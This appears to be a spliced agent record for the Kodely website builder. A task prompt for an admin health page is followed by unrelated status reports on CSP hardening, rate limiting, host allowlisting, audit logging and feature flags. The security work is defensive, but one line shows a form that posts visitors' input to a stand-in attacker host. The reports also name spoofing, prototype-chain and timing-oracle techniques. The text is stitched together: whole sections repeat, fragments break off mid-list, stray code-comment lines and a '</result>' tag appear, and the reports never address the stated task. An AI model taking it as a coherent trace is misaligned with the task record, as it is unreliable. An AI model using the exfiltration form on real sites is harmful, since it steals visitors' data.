input.prompt:
Work in C:\Users\edmem\kodely-prod (Next.js 16 + Prisma, an AI website builder at kodely.me).

BUILD: a system health and observability page for the admin panel.

## Why
When a generation fails, the only trace is `Build.error` in the database and whatever went to stdout. There is no way to see "is generation broken right now" without opening psql. This session alone produced a real example: **8 of 10 local builds failed**, almost all on SDK auth (`Not logged in`, `401 OAuth`), and nothing surfaced that.

## Read first
- `app/api/health/route.ts` — a health endpoint already exists. Read it; extend the page around it rather than duplicating it.
- `prisma/schema.prisma` → `Build` has `status`, `error`, `model`, `repairAttempts`, `costMicros`, `createdAt`, `endedAt`.
- `lib/agent.ts` (the `ENGINE` export), `lib/agent-sdk.ts` (its header comments on imputed cost and subscription auth), `lib/build-site.ts` (the 60s timeout and the shared foundation tree), `lib/events.ts` (`greenBuildRate`).
- `app/admin/users/page.tsx` for query patterns; `lib/auth.ts` for `getAdminUser()`.

## Build
1. **Build health over time** — success/failure counts and rates by hour/day. Failure rate is the headline number.
2. **Failure clustering — the most valuable part.** Group `Build.error` into families rather than listing 200 raw strings. Real examples from this database: SDK auth failures (`Not logged in`, `401`), Windows filesystem errors (`EPERM ... symlink`, `EBUSY ... rmdir`), vite compile errors, and timeouts. Derive the families from the actual error text in the DB — go look at it — and make it obvious when one family suddenly dominates. **A raw error log is not this card; the clustering is.**
3. **Engine and configuration state** — which engine is live (`ENGINE` from `lib/agent.ts`), and a prominent warning when `KODELY_ENGINE=sdk`, because in that mode recorded costs are IMPUTED rather than billed (see the `lib/agent-sdk.ts` header) and every cost figure elsewhere in `/admin` inherits that caveat.
4. **Dependency checks** — database reachable, `KODELY_FOUNDATION_DIR` exists and has `node_modules` (a missing foundation is why local builds fail with a misleading "Cannot find module" — this has bitten twice), SMTP configured, Stripe configured. Show configured/not, **never a secret value** — env var NAMES only.
5. **Timing** — p50/p95 build duration from `createdAt`/`endedAt`, and repair-pass frequency (`repairAttempts > 0`), since a repair costs a second full generation.

## Scope — YOU MAY ONLY CREATE/EDIT: `app/admin/health/**`
DO NOT modify: prisma/schema.prisma, anything under lib/, app/api/** (including the existing health route — read it, don't change it), other app/admin/** subtrees, app/projects/**, app/dashboard/**, app/settings/**, app/globals.css, proxy.ts, deploy.sh, .env, package.json.

## Constraints
- `getAdminUser()` at the top of every page, `notFound()` if null.
- **Never render a secret.** Report configuration as a boolean plus the env var name. Do not echo any value, not even partially masked.
- **No N+1** — `groupBy`/`aggregate`/raw SQL with bound parameters. Read `app/admin/users/page.tsx`.
- Truncate error strings in list views; they can contain user source code.
- No new npm dependencies — **no charting library**; CSS bars and tables. Match the admin idiom (`rounded-xl border border-black/10 dark:border-white/10`, `text-sm`, `tabular-nums`, monochrome). No new white-on-brand-gradient text.
- Do NOT run `npm run build`, `git commit`, `git push`, or `deploy.sh`.
- **HARD GATE: `npx tsc --noEmit` and `npx eslint app lib components` must BOTH be clean.** Parallel agents are running — errors in files you did not touch are not yours.
- Local Postgres available read-only. Note there are only ~10 builds, so build a real empty/low-data state and say so.

## Report back
The error families you derived and what you actually found in the data, how you surfaced the imputed-cost caveat, the dependency checks and their current state on this machine, and what you verified.

content.text:
Cycle continuing. Ten agents in flight, board current.

## Landed since last report

**Moderation findings now persist.** The reasoning on one decision is worth repeating because it's the kind of thing that gets "simplified" away later: non-blocking findings are written once per `(project, rule, file, snippet)` and exact repeats on republish are skipped — not to save disk, but because both consumers break otherwise. The review queue filters on `reviewedAt IS NULL`, so an operator ruling on a repeat would watch an identical unreviewed copy return on every republish forever. And the rule-accuracy panel counts *rows*, so unchecked repeats would make the false-positive denominator measure how often people press publish rather than how often a rule fires on distinct content — one user iterating on one login page would dominate every rule and destroy the exact number the table exists to produce.

It was verified properly too, including a dead-database run that logged without throwing and still returned BLOCKED 400.

**Onboarding is built and wired in.** Progress is fully derived — no schema field, no stored flag — and publishing is both the last step and the exit condition, so there's nothing to reset. It deliberately states **no per-build cost at all**, not even the 120–550 range.

## A real hazard I found while checking an agent's claim

An agent reported its moderation test showed nothing blocking or recording. It was right to suspect the environment: **both local checkouts point at the same database.** `kodely-prod/.env` and `OneDrive/Desktop/Kodely/.env` both use `kodely_personal`, and the older checkout serves different code on port 3000 against the same rows.

That's worse than it first looks — the two checkouts now have **divergent Prisma schemas**. `kodely-prod` has added six models and several columns that the older checkout's generated client knows nothing about. Local-only, so not a production problem, but it produces confidently wrong verification results. Carded with three options; separate databases is the one that makes it structurally impossible.

## Running

Five finishing interrupted work (audit log, feedback inbox, feature flags, sites registry, Editor bundle), five new (auth rate limiting + origin hardening, SEO batch two, competitor synthesis, revenue/retention analytics, blog CMS, system health).

Two of those carry deliberate traps I want them to hit rather than paper over: the analytics agent was told MRR/ARR/churn/CAC are **undefined** for a one-time-purchase product and that computing them would be confident nonsense — the honest subset plus outstanding credit liability is the real deliverable. And the CMS agent was told **not** to bulk-fix the 56 live posts: surface the stale ones, let a human decide each, because an automated find-and-replace is how one error becomes 56.

Tree is green — TypeScript clean, lint at zero.

## Report

**Kodely's real defensible position, in two sentences:** Kodely is the only product in the category you can buy without a subscription — one-time credit packs (Stripe `mode: "payment"`), credits denominated in published dollars ($0.002 each), never expiring, with a compiler rather than a judgement call deciding whether you get charged, a user-set spend cap enforced pre-flight, free rollback to any prior build, and ungated free source export. Everything it wins on is honesty about money and about what was actually shipped; everything it loses on follows from one architectural commitment — `react` + `react-dom` only, no `npm install` per build — which closes the entire app market and cannot be reopened incrementally.

**The 3–5 forced strategic choices:**
1. **Name the market: single-page sites for local businesses, not apps.** The 23 template prompts already made this choice; the board's Market & Users column hasn't. Backend/DB/auth is not reachable from this foundation, so that moat card should be retired rather than left standing.
2. **Re-denominate the credit, or stop selling credits in the headline.** A credit is 1/10th of a cent, so "500 credits" reads generous and means about one website. Blocked on running the eval sweep — it has run once, against one prompt.
3. **The 750 signup grant and the 500-credit starter pack cannot both stand.** A new account is handed 50% more credits than $9 buys; the cheapest pack is dominated by the free tier.
4. **Decide whether the sandbox is a product or a limitation** — market `connect-src 'none'` as a privacy/no-trackers feature, or carve a controlled allowlist. Either way it is gated on closing two open audit findings.
5. **Cut the teardown column to competitors Kodely actually competes with** — Hostinger, GoDaddy Airo, Durable, Squarespace, Wix, Framer.

**Stale/wrong cards found: 24 of 99**, in four groups — 9 wrong on verified facts (Lovable's free tier and its now-unified Cloud billing, Hostinger's switch from message- to credit-metering, Framer's non-existent Scale tier, v0's sunset Premium tier, Replit's monthly price, #87's superseded ARR figures, #64's missing "publishing requires a paid plan", #62/#79 on Base44); 7 carrying a misapplied RECONCILE stamp (#88–#94); 4 describing a product that can no longer be signed up for (Firebase Studio #56/#57/#58/#61); and 4 that are research requests rather than findings (#95–#98). Roughly a dozen more are about products out of scope entirely if choice 1 lands.

**Cards written: 25** (the cap), all decisions or actions with reasoning in the description — 6 URGENT, 11 HIGH, 7 NORMAL, 1 LOW.

**Two findings worth flagging directly, both of which changed my conclusions mid-analysis:**
- I had to walk back a claim. `connect-src 'none'` blocks scripted requests, but `form-action` and `base-uri` are unset, so a generated page **can** POST to any external host — and `docs/security/audit-2026-08.md` H1 (no `Host` check on the site route) is still open, meaning generated HTML is servable on the app origin. The sandbox is a real differentiator but must not be marketed in its absolute form until both are closed.
- **Signup has no rate limit and no email verification**, while granting 750 credits ($1.50 of real model spend) plus a server-side compile. An unverified email is currently worth up to 950 credits. That is an unpriced charge against the 87–89% margin the pricing model assumes.</result>

input.message:
Additional finding for your scope — you own `app/api/site/[slug]/**`, so please fold this in.

The sandbox CSP is missing `form-action`, `base-uri`, and `object-src`. Current value in both `app/api/site/[slug]/[[...path]]/route.ts` and `app/api/preview/[id]/[[...path]]/route.ts`:

    default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; frame-ancestors 'self'

**`form-action` does NOT fall back to `default-src`.** Neither does `base-uri`. So `connect-src 'none'` — which the codebase and the marketing copy both treat as "generated sites cannot make external requests" — never covered form submission at all. A generated page can contain:

    <form action="https://attacker.example/collect" method="POST">

and it will submit cross-origin, carrying whatever a visitor typed. That is precisely the credential-exfiltration path `lib/moderation.ts` currently tries to catch with heuristics, and it interacts directly with H1: a phishing form served as first-party content on kodely.me that also POSTs to an attacker is materially worse than either issue alone.

Please add to BOTH route files (they share the same constant, defined separately in each):
- `form-action 'self'` — a generated site has no backend, so it has nothing legitimate to POST to. `mailto:` links are `<a href>`, not form actions, so this does not break the link-out CTA pattern the templates rely on. Verify that yourself rather than taking my word for it.
- `base-uri 'none'` — stops an injected `<base href>` rewriting every relative URL on the page.
- `object-src 'none'` — plugin content; no legitimate use here.

Two things to check before you commit to `form-action 'self'`:
1. Does anything in the generated-site foundation (`lib/foundation.ts`) or the 23 template prompts (`lib/templates.ts`) legitimately use a `<form>`? The prompt now forbids forms that pretend to work, but confirm rather than assume.
2. Confirm the value doesn't break the existing preview flow.

Keep the two constants in sync — if you find a clean way to share them without breaking your `siteHostAllowed` module boundary, do it; otherwise duplicate with a comment on both saying they must match.

Also worth knowing: I verified your H1 work landed (`proxy.ts` now calls `siteHostAllowed`, and the signup rate limiter is in). Please make sure your report covers whether the staging path `staging.kodely.me/api/site/<slug>` and the `<slug>.kodely.site` rewrite both still resolve — that is the regression I most want proven, not argued.

content.text:
The competitive synthesis landed and it's sharp. Two findings changed my picture of the product.

## A gap in the sandbox that the marketing copy assumes away

`connect-src 'none'` has been treated throughout this codebase — and on the pricing page — as "generated sites cannot make external requests." I verified the actual header: it sets `default-src`, `style-src`, `script-src`, `img-src`, `connect-src`, `frame-ancestors`. **No `form-action`, no `base-uri`, no `object-src`.**

`form-action` **does not fall back to `default-src`**. So a generated page can contain `<form action="https://attacker.example/collect" method="POST">` and it submits cross-origin, carrying whatever a visitor typed. `connect-src` only ever blocked *scripted* requests.

That's precisely the exfiltration path `lib/moderation.ts` tries to catch heuristically — and it compounds H1: a phishing form served as first-party content on kodely.me *that also POSTs to an attacker* is materially worse than either issue alone. I've routed the fix to the agent that owns those files, with instructions to verify `form-action 'self'` doesn't break the `mailto:`/`tel:` link-out pattern the 23 templates depend on rather than assume it.

## Your free tier is currently unpriced

Signup has **no rate limit and no email verification**, while granting 750 credits of real model spend plus a server-side compile. The agent's framing: an unverified email address is currently worth up to 950 credits. That's an unpriced charge against the 87–89% margin the pricing model assumes. The rate limiter is landing now; verification is a separate decision.

## Three pricing contradictions worth your attention

- **The 750 grant and the $9/500-credit starter pack can't both stand.** A new account is handed 50% more credits than the cheapest pack buys. The pack is dominated by the free tier.
- **A credit is 1/10th of a cent**, so "500 credits" reads generous and means roughly one website.
- The agent also walked back one of its own claims mid-analysis when it checked the CSP — I'd trust its conclusions more for that, not less.

## Board

**25 synthesis cards inserted at the top of Competitor Teardowns**, ahead of the 99 observations — six URGENT, all decisions or actions rather than more observations. It found **24 of the 99 stale or wrong** on verified facts (competitor tiers that no longer exist, pricing that changed, four products describing something you can't sign up for any more).

Its two-sentence read on your position: everything Kodely wins on is honesty about money and about what actually shipped; everything it loses on follows from one architectural commitment — `react` + `react-dom` only, no `npm install` per build — which closes the app market and can't be reopened incrementally.

That's the same wall the Kodely Pro research hit independently. Two agents reaching it separately makes it the real decision on this board.

Nine agents still running.

content.text:
The audit-log agent is done and it found two genuine bugs in its predecessor's code, not just unfinished work.

## A prototype-chain hole

`isAdminAction` was `typeof v === "string" && v in ADMIN_ACTION_INFO`. The `in` operator **walks the prototype chain**, so `?action=toString` passed a guard whose entire job is to say "this is one of ours" — and the page would then have read a `Function` off `Function.prototype` and handed it to React. Fixed with `hasOwnProperty`, and verified over HTTP: `?action=toString` now renders unfiltered instead of filtering to zero.

## A 500 on large page numbers

`(page - 1) * 50` went straight to Prisma as `skip`. The agent probed the real boundary rather than guessing — 5e18 fine, 5e21 throws — then proved the fix by *temporarily removing the clamp* and confirming the 500 came back. It also corrected its own comment mid-run after the test contradicted its first guess about an int32 limit.

38 assertions against real Postgres, then a real browser render with 61 seeded rows, then complete cleanup back to 0 rows.

## The useful output: a work order

It produced a precise list of **14 admin surfaces that read or mutate customer data with no record of who** — nine reads (every user, site, and notes page) and five writes. The writes matter most because the underlying tables keep no history: `ModerationFinding` stores only the *latest* verdict, and `FeatureFlag` keeps no previous value. A finding quietly re-ruled, or a kill switch flipped at 3am, is currently untraceable.

Those files belong to three agents still running, so I've routed the work to each with the specific names, targets, and two hard privacy rules: **never the note body**, and **never the search query** — on those pages a query is almost always a customer's email, and an audit log is the worst possible place to accumulate those.

It also flagged a blocker the flags agent has to fix first (`requireAdminEmail()` returns only an email, but recording needs `{ id, email }`), and one call site in the sites actions that hand-builds the audit row instead of using the helper — the single place where a typo would silently write an unfilterable action name.

One judgement I agree with: reads of `/admin/flags` itself are deliberately **not** on the list. Kill-switch config is our data, not a customer's.

Tree is green. Nine agents still running.

## H2 — pre-auth rate limiting

**Files:** `lib/rate-limit.ts` (+338 lines, existing limiters untouched), `app/api/auth/login/route.ts`, `app/api/auth/signup/route.ts`

**Keying.** Login is gated on two buckets that must *both* pass before either is consumed:
- **per-IP** — 20 / 15 min and 60 / hour. Stops spraying from one source.
- **per-account** (SHA-256 of the email with a per-process salt, so the map isn't a running plaintext list of attempted addresses) — 5 / 15 min and 20 / hour. This is the credential-stuffing answer: many IPs against one email is exactly the case an IP key cannot see. Both verdicts are taken before either is recorded, so an attacker already blocked on their own IP can't keep filling victims' account buckets.

Signup is **per-IP only** — 5 / hour, 15 / day. It is a volume problem, and the daily rule is what bounds the money (750 credits ≈ $1.50 per account that lands).

**Consume-then-refund, not count-failures.** Counting only failures means the write happens after `verifyPassword` resolves, with `await`s in between — a thousand concurrent guesses would all pass the check before the first failure was recorded, and the limiter would read as correct while stopping nothing. So every login attempt consumes synchronously, and a correct password calls `noteLoginSuccess`, which **clears the account bucket** (whoever proved the password owns the account) and **refunds one hit on the IP bucket** (so a NAT'd office is never spent by people signing in correctly, while an attacker who owns one valid account can't log into it repeatedly to wipe guesses made against everyone else). Proven: 25 consecutive successful logins from one IP, all 200, well past the 20/15-min cap.

**Client IP header — `cf-connecting-ip`, and nothing else.** Cloudflare *sets* it on every request, overwriting the client's value. `x-forwarded-for`'s **first** entry is attacker-controlled, because Cloudflare appends rather than replaces — that is exactly bug M3 in `app/api/contact/route.ts`, and keying on it would hand an attacker a fresh bucket per request. The **last** entry isn't spoofable but is useless: each nginx hop appends the *previous* hop's address, so on arrival it is our own front nginx, a constant that would bucket the whole internet together. Reasoning is written out in the file.

**Fail direction — closed.** A request with no `cf-connecting-ip` did not come through the edge (Next gives a route handler no socket address to fall back on), so all such traffic shares one strict bucket rather than being exempt. Residual, stated in the comment: anyone who can reach the origin IP directly, bypassing Cloudflare, *can* forge `cf-connecting-ip` — no application code can detect that; the fix is firewalling the origin to Cloudflare's ranges, which is infra work outside this repo.

**Storage — in-memory, deliberately, and this is the main caveat.** The two DB-backed limiters count rows the feature already writes (`Build`, `Project`); a failed login writes nothing, and `prisma/schema.prisma` is off-limits, so there is no table for it. I considered and rejected borrowing the analytics `Event` table: its contract is an explicit closed vocabulary of non-PII product events that the privacy policy is written from, and IP-keyed security counters are neither. So **this is per-process and resets on every deploy or restart — it fails open across that boundary**, and if the app is ever run as more than one process the effective limit multiplies by the process count. The check → record → forget shape is deliberately the shape a `LoginAttempt` table would have; promoting it is a one-model migration and is the right next step.

**Non-disclosure.** One shared `RATE_LIMITED_MESSAGE` for both rules and both routes. I also added a decoy scrypt hash to login so an unknown email costs the same as a wrong password — previously `verifyPassword` was skipped entirely for unknown addresses, a clean ~100ms-vs-1ms existence oracle that undercut the constant response *shape* the route already kept. Measured after: registered 0.047s / 0.046s / 0.046s vs unknown 0.046s / 0.064s / 0.043s, both 401.

**Tested** against a local production build on `:3009`: per-account cap trips on attempt 6 with each guess from a different IP (203.0.113.1–7); identical 401→429 sequence and identical body for a nonexistent address; per-IP cap trips on attempt 21 across 22 distinct targets from one IP; `Retry-After: 897` then `900` (window-aware, not a flat hour); signup allows exactly 5 then 429 on a fresh key, a second IP unaffected; malformed bodies (400) consume nothing; 4 failures → correct password → 5 more failures all 401, proving the success clear. Two probe accounts were created and deleted afterwards.

## H1 — sites served on the app origin

New `app/api/site/[slug]/site-host.ts` holds one allowlist (not a blocklist — a blocklist would have to enumerate apex, www, the admin host and every future name, and fails open when one is added). Three shapes allowed: `<slug>.kodely.site` (**must match this slug** — `a.kodely.site/api/site/b/` is refused, which also stops one customer hosting another's page on their origin), the staging host (`KODELY_STAGING_HOST`, default `staging.kodely.me`), and loopback. It is enforced in the route (authoritative, byte-identical to the existing "Site not found." 404) *and* in `proxy.ts`, which rewrites to the same `NOWHERE` target `/admin` uses, so kodely.me returns Next's ordinary 404 with no DB round trip.

Proven with real `Host` headers against `npx next start -p 3009` (nothing was sent to any remote host):

| Host | Path | Before | After |
|---|---|---|---|
| `zz-sites-probe-clean.kodely.site` | `/`, `/assets/chunk-1.js`, `/robots.txt`, `/sitemap.xml` | 200 | **200** |
| `staging.kodely.me` | `/api/site/<slug>`, `/index.html`, `/assets/chunk-1.js`, `/robots.txt` | 200 | **200** |
| `kodely.me` | `/api/site/<slug>`, `/index.html` | 200 | **404** |
| `kodely.me` | `/api/site/<slug>/` | 200 | 308 → **404** |
| `www.kodely.me`, `ops-7f3k2q.kodely.me`, `51.79.162.96` | `/api/site/<slug>/index.html` | 200 | **404** |
| `zz-sites-probe-clean.kodely.site` | `/api/site/<other-slug>/index.html` | 200 | **404** |

`lib/site-seo.ts` output is unchanged in both live forms: subdomain gives `canonical`/`og:url` = `https://local-build-test-r5hlk.kodely.site`; staging gives `https://staging.kodely.me/api/site/local-build-test-r5hlk`, and its `robots.txt` still points at the path-form sitemap. Ordinary app routes (`/`, `/login`, `/signup`, `/pricing`, `/blog`, `/contact`, `/templates`, `/api/health`) return 200 on both `kodely.me` and `staging.kodely.me`.

Added `form-action 'self'; base-uri 'none'; object-src 'none'` to `SANDBOX_CSP` in **`app/api/site/[slug]/[[...path]]/route.ts` only**, header confirmed on the wire.

Checks you asked for, done rather than assumed: no `<form>` anywhere in `lib/foundation.ts`; every template in `lib/templates.ts` explicitly forbids one ("there is no backend, so no contact form"), and `lib/agent.ts:94-96` says the same; all CTAs are `tel:`/`mailto:`/`sms:` in `<a href>`, which `form-action` does not govern (it applies to `<form action>` and `formaction=` only). - **No durable store** for the auth limiter (see above) — the single most valuable follow-up, and the one thing that makes this weaker than the audit's recommended fix.

**Consume-then-refund, not count-failures.** Counting only failures means the write happens after `verifyPassword` resolves, with `await`s in between — a thousand concurrent guesses would all pass the check before the first failure was recorded, and the limiter would read as correct while stopping nothing. So every login attempt consumes synchronously, and a correct password calls `noteLoginSuccess`, which **clears the account bucket** (whoever proved the password owns the account) and **refunds one hit on the IP bucket** (so a NAT'd office is never spent by people signing in correctly, while an attacker who owns one valid account can't log into it repeatedly to wipe guesses made against everyone else). Proven: 25 consecutive successful logins from one IP, all 200, well past the 20/15-min cap.

**Client IP header — `cf-connecting-ip`, and nothing else.** Cloudflare *sets* it on every request, overwriting the client's value. `x-forwarded-for`'s **first** entry is attacker-controlled, because Cloudflare appends rather than replaces — that is exactly bug M3 in `app/api/contact/route.ts`, and keying on it would hand an attacker a fresh bucket per request. The **last** entry isn't spoofable but is useless: each nginx hop appends the *previous* hop's address, so on arrival it is our own front nginx, a constant that would bucket the whole internet together. Reasoning is written out in the file.

**Fail direction — closed.** A request with no `cf-connecting-ip` did not come through the edge (Next gives a route handler no socket address to fall back on), so all such traffic shares one strict bucket rather than being exempt. Residual, stated in the comment: anyone who can reach the origin IP directly, bypassing Cloudflare, *can* forge `cf-connecting-ip` — no application code can detect that; the fix is firewalling the origin to Cloudflare's ranges, which is infra work outside this repo.

**Storage — in-memory, deliberately, and this is the main caveat.** The two DB-backed limiters count rows the feature already writes (`Build`, `Project`); a failed login writes nothing, and `prisma/schema.prisma` is off-limits, so there is no table for it. The check → record → forget shape is deliberately the shape a `LoginAttempt` table would have; promoting it is a one-model migration and is the right next step.

## H1 closed, with the regression actually proven

It built an allowlist rather than a blocklist — and the reasoning matters: a blocklist would have to enumerate apex, www, the admin host, and every future name, and **fails open** the moment someone adds one.

The proof table is what I wanted:

| Host | Before | After |
|---|---|---|
| `<slug>.kodely.site` | 200 | **200** |
| `staging.kodely.me/api/site/<slug>` | 200 | **200** |
| `kodely.me/api/site/<slug>` | 200 | **404** |
| `www.kodely.me`, admin host, raw IP | 200 | **404** |
| `a.kodely.site/api/site/<b>` | 200 | **404** |

That last row is a bonus catch — one customer could previously host another customer's page on their own subdomain. And `lib/site-seo.ts` canonical/OG output is unchanged in both live forms, which was the regression I was most worried about.

## The rate limiter avoids a trap I'd have missed

Counting only *failed* logins looks correct and isn't: the write happens after `verifyPassword` resolves, so a thousand concurrent guesses all pass the check before the first failure records. The limiter would read as working while stopping nothing.

So it consumes synchronously on every attempt and refunds on success — clearing the account bucket, refunding one IP hit. That keeps a NAT'd office from being spent by people signing in correctly, while stopping an attacker who owns one valid account from repeatedly logging in to wipe guesses made against everyone else. Proven with 25 consecutive successful logins past a 20/15-min cap.

On the client IP it rejected `x-forwarded-for` outright: Cloudflare **appends** rather than replaces, so the first entry is attacker-controlled — which it identified as an existing bug in the contact route — and the last entry is our own nginx, bucketing the entire internet together.

It also found and closed a **timing oracle I didn't know about**: `verifyPassword` was skipped entirely for unknown emails, making an unknown address ~1ms versus ~100ms for a wrong password. A decoy scrypt hash now equalises it, measured at 0.046s both ways.

## The honest caveat

The limiter is **in-memory, so it resets on deploy and fails open across that boundary**, and multiplies by process count if the app is ever run multi-process. It rejected borrowing the analytics `Event` table on the grounds that its contract is a closed vocabulary of non-PII product events the privacy policy is written from — IP-keyed security counters are neither. That's the right call, and a `LoginAttempt` table is a one-model migration I can do.

Also inherent and worth knowing: per-account throttling *is* a small account-lockout DoS — anyone who knows an email can cost that user a few minutes. Verifying the password before throttling would remove it but restore unlimited guessing, so there's no free option.

Design was sound and essentially complete — four routes (`/admin/feedback`, `/admin/feedback/notes`, `/admin/feedback/notes/[userId]`), sharing the `app/admin/users/ui.tsx` primitives so it reads as one panel. `getAdminUser()` + `notFound()` at the top of all three pages, and independently inside the Server Action. I finished it rather than rewrote it. Two changes of my own:

- **`page.tsx`** — reason counts were taken over *all* ratings while the percentages were divided by the thumbs-down count. The API (`app/api/feedback/route.ts`) will accept `reason` on an "up" rating even though today's UI only offers it after a thumbs-down, so a single stray row could have printed a percentage over 100. Reason counting is now scoped to thumbs-down, which makes `withReason + noReason === down` true by construction.
- Audit logging (§4).

**The question the inbox answers** is the first thing on the page, not buried: a "Needed a repair pass" stat tile, then a **Rating vs. repair pass** cross-tab (first-try / repaired / not-recorded × up / down / down-rate) with a plain-English verdict underneath that names *reliability* or *quality* — gated behind an n≥10-per-bucket check so three ratings never read as a finding.

The code was complete and unusually well-reasoned — but had never been run. It typechecked and the design held up under scrutiny; the defaults, the closed key set, and the per-flag fail direction were all sound. Two things were actually wrong, plus the audit gap you sent mid-task.

## What I proved (110 assertions against the local Postgres, all passing)

Compiled `lib/flags.ts` to CommonJS and exercised it against `kodely_personal`, with a stub swapped in for `lib/db` where I needed to simulate an outage.

**`isEnabled()` resolution** — all six flags with no row resolve to their declared `whenUnset` (`generation` true, `sdk_engine` false, so the per-flag axis is genuinely exercised). `enabled=false, pct=100` → false, proving `rolloutPct` really is ignored when off. `pct=0` → false. Out-of-range stored values (`250`, `-5`) behave, rather than producing a modulo surprise. Selected fraction tracks the percentage at 1/10/25/50/75/99% over 20k ids, all within 1.5 points.

**Bucketing is stable per user** — 5,000 ids, first answer recorded, then re-checked across (a) three more rounds on the same cached snapshot, (b) a cache invalidation and fresh DB read, (c) a fresh module instance simulating a cold process. **Zero flips in 20,000 re-checks.** `rolloutBucket()` is also identical across module instances, so nothing hides in per-process state.

**Two flags at 50% do not pick the same half** — over 40,000 ids, `generation` selects 49.63%, `publishing` 50.31%, and the **overlap is 24.93%** — independent, not identical. φ = −0.0015. I ran the same comparison across all 15 flag pairs: worst |φ| = 0.0141. As a control I computed what hashing the id *alone* would give: 50.0% overlap, i.e. one cohort getting every experiment. The key **is** mixed in and it matters. Buckets are uniform (χ²=93.2 on df=99), and 2,000 back-to-back cuid-style ids still split 10.9% at `pct=10`, so the timestamp-prefix clumping failure mode is absent.

**Cache TTL** — warmed the cache, flipped the row in the DB behind the module's back with no invalidation, then polled every 200ms for 20s. Stayed cached-true through 47 samples across the whole 10s window, and flipped at **10,174ms**. Not before, not never. `invalidateFlagCache()` is immediate. Also: 100 concurrent cold-cache checks issue **one** query (single-flight); 200 checks against a dead DB issue **one** (error backoff).

**Fail-safe, both halves** — cold process with an unreachable DB returns each flag's declared `whenUnavailable`; all four kill switches fail CLOSED, `prompt_enhance` OPEN, `sdk_engine` CLOSED. Separately, a *warm* process whose DB then dies keeps serving last-known values — I set `sdk_engine` ON (default false) and `prompt_enhance` OFF (default true) so stale-vs-default differ in both directions, waited out the TTL, and both held their stored values. An engaged kill switch stays engaged through the outage, and recovers when the DB returns.

## What was wrong, and fixed

**1. `invalidateFlagCache()` was not actually a guarantee (real bug).** A read already in flight when a write landed would resolve with the pre-write rows and repopulate the cache *after* the invalidation — pinning the stale value for a full TTL in the very process that performed the write. That contradicts both the module's own promise and the sentence on the admin page. I wrote a failing test that reproduced it deterministically, then added an `epoch` counter: a refresh records the epoch it started under and refuses to publish its result (or to clear the `inFlight` slot) if invalidation bumped it. Test flipped to passing.

**2. The "Off right now" tile cried wolf.** `feature.sdk_engine` is off *at its declared steady state*, so a freshly seeded, perfectly healthy system rendered an amber "Something is switched off" permanently — an always-on warning is one nobody reads on the day it means something. It now colours only for flags off *against* their `whenUnset`, and says which. Verified both states in the rendered HTML: healthy → grey "all at their declared steady state"; after actually killing `rewards` → amber, "1 switched off against its steady state".

**3. Audit wiring** (your mid-task addition). `requireAdminEmail()` → `requireAdmin()` returning the whole actor. All three actions record, and I confirmed the rows land: `flag.seeded` meta `{"created":1}`; `flag.changed` target `flag`/`generation.enabled` meta `{"intent":"off","enabled":false}`; `flag.changed` meta `{"intent":"rollout","rolloutPct":100}` — the **clamped** value, from a submitted 420, since the log should say what was stored; `flag.deleted` target `zz.retired_switch`. Rejected writes (no cookie, key outside `FLAGS`, delete of a live flag) all 500 and leave **no** audit row and no state change.

One judgement call worth your review: `flag.deleted` goes in the **same transaction** as the delete, via a new optional `auditRow` parameter on `deleteOrphanFlag`. `setFlag` overwrites a value the flag row itself can still describe afterwards; a deleted row and its `updatedBy`/`updatedAt` are simply gone, so a second-statement insert would leave a window where the row is destroyed and nothing says who did it. The other two record after the mutation — recording first would risk a row asserting a change that then failed to apply, which is a false statement in an accountability record.

Server on :3199 and :3487 were killed under me by parallel agents mid-verification; I ended up on :3007/:3003. I drove the real Server Actions as **multipart form POSTs with no JavaScript**, which is exactly the progressive-enhancement path the code claims to support. ## Decisions, as they stand

**TTL 10s**, per-process, whole table in one query (~0.1 qps/process regardless of flag count). Converges rather than flips atomically across processes; the writing process sees its own change immediately.

**Hashing:** `sha256("${subjectId}:${key}")`, first 4 bytes as uint32, mod 100, from `node:crypto`. Subject makes it stable, key decorrelates flags. Modulo bias ~1e-8.

18	//    An audit log that quietly accumulates copies of customer data is a second
19	//    data-protection problem wearing the clothes of a solution.

33	// rollout percentages, which are our data, not a customer's. Its writes are

- **MRR / ARR — undefined.** No recurring revenue exists to annualise. Averaging one-time pack purchases per month would invent a stream no customer agreed to, and would keep reporting it in a month with zero sales.
- **Churn — undefined.** Nothing to cancel. Someone who bought credits and stopped building holds a spendable balance; that shows up as a liability, not a lost customer. The honest analogue I built instead is a "still building, by weeks since signup" cohort grid.
- **CAC — uncomputable.** No marketing spend and no attribution is recorded anywhere. `lib/events.ts` documents that the two acquisition events that would have carried a source were removed on 2026-08-22 because no beacon fired them. No numerator, no denominator.
- **LTV — partial.** Realised revenue per signup to date is shown and labelled as realised. No projection.

## What I built

1. **Realised revenue** from `CreditLedger` rows with a `stripe:` reason. The approximation is stated in the UI: the webhook writes `delta = pack.credits` and `reason = "stripe:<session id>"` — a *session* id, not a pack id — so the only bridge back to dollars is the credit count. That is unambiguous today because the three packs are 500/2,500/6,000, and any row matching no pack goes into an explicit "unattributed" bucket rather than being priced by a guess. Also surfaced: figures are gross list price (Stripe fees are recorded nowhere), and a dashboard refund writes nothing here, so neither is deducted.
2. **Cost and meter recovery by week** — deliberately *not* called margin. `creditsFor()` is `ceil(costMicros / MICROS_PER_CREDIT)`, so `creditsCharged × MICROS_PER_CREDIT − costMicros` is mathematically guaranteed to be rounding noise. It measures whether the meter recovered the spend it metered, and is labelled as that. A "given away" column shows cost on builds charged zero credits.
3. **Signup cohorts + retention grid**, sourced from `User`/`Project`/`Build`/`CreditLedger` rather than `Event`, with the reason stated: those tables have recorded everything since day one, and the event stream has not.

`KODELY_ENGINE=sdk` in `.env`, so this fires today. An amber block sits **immediately above** the cost table (not in a footnote), stating that token counts are real but priced against the API rate card and no money moved. ## Credit liability against real data

**2,753 credits outstanding, held by 4 users = $5.51 of committed future model spend.** All of it free-granted; deferred revenue is 0. Cross-check passes: newest `balanceAfter` rows and the sum of every delta both give 2,753.

Realised revenue is **$0.00** — zero `stripe:` rows have ever been written. The page says that explicitly rather than rendering an empty chart. content.text:
All 15 admin surfaces now audit-logged — the work order the audit agent produced is closed, and the vocabulary reflects reality rather than a stale to-do.

## The margin tile was lying, and I verified it before changing it

The analytics agent flagged `/admin`'s "Gross margin" tile. The arithmetic confirms it completely: `creditsFor()` is `ceil(costMicros / MICROS_PER_CREDIT)`, so the "revenue" was **derived from the cost it was being compared against**. The difference is the rounding remainder and nothing else — bounded at **$0.0019 per build regardless of build size**.

